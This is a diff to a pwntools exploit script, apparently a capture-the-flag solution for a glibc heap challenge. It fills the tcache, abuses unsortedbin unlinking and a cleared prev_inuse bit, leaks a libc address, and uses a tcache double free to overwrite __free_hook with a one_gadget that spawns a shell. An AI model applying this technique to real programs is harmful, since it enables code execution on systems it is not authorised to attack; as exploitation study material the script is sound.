@@ -13,11 +13,11 @@ g_elf = ELF(g_fname)
 g_libcname =  "./libc64.so" if LOCAL else "./libc64.so"
 
 if (LOCAL):
-	g_io = process([ld_name, g_fname], env={"LD_PRELOAD" : g_libcname})
+	g_io = process(g_fname)
+	g_libc = g_io.libc
 else:
 	g_io = remote()
-
-g_libc = ELF(g_libcname)
+	g_libc = ELF(g_libcname)
 
 def getpid():
 	if (DEBUG & LOCAL):
@@ -56,12 +56,12 @@ def pwn():
 	delete(9) # prevent chunk merge into heap's top
 	# now tcache is full
 	
-	delete(6) # put chunk_B into unsortedbin
-	delete(7) # put chunk_A into unsortedbin, trigger unlink, modify chunk_C.prev_size = 0x200, clean chunk_C.size's LSB
-	delete(8)
+	delete(6) # put chunk_A into unsortedbin
+	delete(7) # put chunk_B into unsortedbin, trigger unlink, modify chunk_C.prev_size = 0x200, clean chunk_C.size's LSB
+	delete(8) # put chunk_C into unsortedbin
 	 
 	# empty tcache, so the following malloc will get chunk from bins.
-	# They take idx=[0, 1, 2, 3, 4, 5, 6]
+	# They take idx=[0, 6]
 	for i in range(7):
 		add(0x10, str(i)+'\n')
 	
@@ -76,7 +76,7 @@ def pwn():
 	# now tcache is full.
 	delete(7) # put chunk_A into unsortedbin
 
-	add(0xf8, "Get B from tcache, idx=0, and clear C's prev_in_use bit.")
+	add(0xf8, "Get B from tcache, idx=0, and clear C's prev_inuse bit.")
 	delete(6) # now tcache is full
 	delete(9) # free chunk_C, trigger unlink
 
@@ -91,22 +91,20 @@ def pwn():
 	show(0)
 	addr_ub = u64(rl()[:-1].ljust(8, b'\0'))
 	g_libc.address = addr_ub - 96 -  0x3ebc40
-	off_one_gadget = 0xdeec2 if LOCAL else 0xdeec2
+	off_one_gadget = 0x4f432 if LOCAL else 0xdeec2
 	one_gadget = g_libc.address + off_one_gadget 
 	log.success("unsortedbin@%#x\nlibc@%#x\none_gadget@%#x\n__free_hook@%#x", addr_ub, g_libc.address, one_gadget, g_libc.symbols["__free_hook"])
 
 	# Part 2, tcache double free hijack __free_hook
 	getpid()
 	# tcache should remain empty
-	add(0xf8, "double allocate B by spliting, idx=8")
+	add(0xf8, "double allocate B by spliting, idx=9")
 	
-	for i in range(1, 6):
-		delete(i)
+	delete(1) # make sure there are 3 chunks in tcache.
 	# double free B
 	delete(0)
 	delete(9)
 
-	# add(0x8, p64(g_libc.symbols["__realloc_hook"])) # idx=0
 	add(0x8, p64(g_libc.symbols["__free_hook"])) # idx=0
 	add(0x8, "none")		# idx=1
 	# cannot read '\x00', so only the first 6 bytes of one_gadget will be read.
@@ -114,7 +112,6 @@ def pwn():
 
 	# trigger one_gadget
 	delete(1)
-	# add(0x20, "getshell")
 
 if ("__main__" == __name__):
 	debug_on()
